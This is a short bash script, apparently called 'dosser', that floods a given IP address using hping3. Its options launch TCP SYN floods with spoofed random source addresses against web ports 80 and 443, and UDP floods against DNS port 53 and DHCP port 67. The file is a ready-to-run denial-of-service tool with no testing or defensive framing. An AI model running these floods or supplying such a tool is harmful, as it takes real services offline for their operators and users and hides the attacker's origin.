#!/bin/bash

show_help() {
	echo "usage: dosser [options]"
	echo "  -h		show this help message"
	echo "  -t  <IP>	TCP HTTP DoS (port: 80)"
	echo "  -T  <IP>	TCP HTTPS DoS (port: 443)"
	echo "  -u  <IP>	UDP DNS DoS (port: 53)"
	echo "  -U  <IP>	UDP DHCP DoS (port: 67)"
	echo ""
	exit 0
}

while getopts ":ht:T:u:U:" opt; do
	case ${opt} in
		h )
			show_help
			;;
		t )
			IP="$OPTARG"
			sudo hping3 -S --flood --rand-source -p 80 "$IP"
			;;
		T )
			IP="$OPTARG"
			sudo hping3 -S --flood --rand-source -p 443 "$IP"
			;;
		u )
			IP="$OPTARG"
			sudo hping3 --udp --flood --destport 53 "$IP"
			;;
		U )
			IP="$OPTARG"
			sudo hping3 --udp --flood --destport 67 "$IP"
			;;
		\? )
			echo "Invalid option -$OPTARG" >&2
			show_help
			;;
		: )
			echo "Option -$OPTARG requires an argument." >&2
			show_help
			;;
	esac
done

if [ $# -eq 0 ]; then
	show_help
fi
